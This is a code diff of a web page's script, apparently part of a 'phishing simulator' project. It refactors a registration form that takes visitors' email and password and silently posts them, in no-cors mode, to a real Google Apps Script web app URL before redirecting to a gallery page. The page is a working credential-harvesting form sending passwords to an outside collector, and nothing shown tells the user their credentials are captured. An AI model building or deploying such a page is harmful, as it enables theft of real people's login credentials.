@@ -399,58 +399,31 @@
 </div>
 
 <script>
-  // Toggle password visibility
-  window.toggleEmail = function() {
-    const field = document.getElementById('password');
-    const icon  = document.getElementById('toggleEmail');
-    const show  = field.type === 'password';
-    field.type  = show ? 'text' : 'password';
-    icon.textContent = show ? '◡' : '👁';
-  }
-
   const form = document.getElementById('infoForm');
   const msg  = document.getElementById('message');
 
+  // Replace with your Apps Script Web App URL
+  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxntk7kNMq8x8uNP-QSVbfyi69DtjKgyR_4as1Qw_Hvhjo5ZDodnLDasVjZQ2FAP5c/exec";
+
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
-
-    const submitBtn = form.querySelector('button[type="submit"]');
-    submitBtn.querySelector('.btn-inner').innerHTML = 'Registering <span class="btn-arrow">✦</span>';
-    submitBtn.style.background = '#5b1fa0';
-    submitBtn.disabled = true;
-
-    msg.classList.add('visible');
+    msg.style.display = "block";
     msg.textContent = "Submitting...";
 
+    const formData = new FormData();
+    formData.append("email", document.getElementById('email').value);
+    formData.append("password", document.getElementById('password').value);
+    formData.append("key", "phishingsimulator"); // must match Apps Script
+
     try {
-      const formData = new FormData();
-
-      formData.append("email", document.getElementById('email').value);
-      formData.append("password", document.getElementById('password').value);
-      formData.append("key", "phishingsimulator"); // must match Apps Script
-
-      await fetch(
-        "https://script.google.com/macros/s/AKfycbxntk7kNMq8x8uNP-QSVbfyi69DtjKgyR_4as1Qw_Hvhjo5ZDodnLDasVjZQ2FAP5c/exec", 
-        // 🔴 REPLACE THIS WITH YOUR /exec URL
-        // Example: https://script.google.com/macros/s/XXXX/exec
-
-        {
-          method: "POST",
-          mode: "no-cors",
-          body: formData
-        }
-      );
-
+      await fetch(SCRIPT_URL, { method: "POST", body: formData, mode: "no-cors" });
       msg.textContent = "Registered! Redirecting...";
-
-    } catch (err) {
+    } catch(err) {
       console.error(err);
-      msg.textContent = "Error submitting.";
+      msg.textContent = "Submission failed.";
     }
 
-    setTimeout(() => {
-      window.location.href = "fish.html";
-    }, 1000);
+    setTimeout(() => { window.location.href = "gallery.html"; }, 1000);
   });
 </script>
 
